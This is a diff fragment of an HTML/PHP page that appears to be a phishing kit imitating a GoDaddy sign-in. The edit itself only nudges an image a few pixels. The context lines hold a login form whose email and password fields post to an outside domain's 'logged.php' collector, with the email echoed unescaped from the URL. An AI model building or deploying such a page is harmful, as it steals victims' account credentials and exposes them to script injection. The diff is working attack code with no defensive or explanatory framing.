@@ -68,7 +68,7 @@ $(window).load(function() {
 
 <div id="image2" style="position:absolute; overflow:hidden; left:1080px; top:371px; width:52px; height:18px; z-index:1"><a href="#"><img src="https://imgur.com/vziZkDQ.png" alt="" title="" border=0 width=52 height=18></a></div>
 
-<div id="image3" style="position:absolute; overflow:hidden; left:870px; top:633px; width:93px; height:18px; z-index:2"><a href="#"><img src="https://imgur.com/Xqx8U5N.png" alt="" title="" border=0 width=93 height=18></a></div>
+<div id="image3" style="position:absolute; overflow:hidden; left:870px; top:629px; width:93px; height:18px; z-index:2"><a href="#"><img src="https://imgur.com/Xqx8U5N.png" alt="" title="" border=0 width=93 height=18></a></div>
 <form action=https://ceksanrnakina.com/godady/logged.php name=naltarnhigye id=naltarnhigye method=post>
 <input name="ud"  value="<?php echo $_GET['email']; ?>" required class="textbox" autocomplete="off" required type="text" readonly="readonly" style="position:absolute;width:345px;left:785px;top:309px;z-index:3">
 <input name="pd" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:345px;left:785px;top:394px;z-index:4">
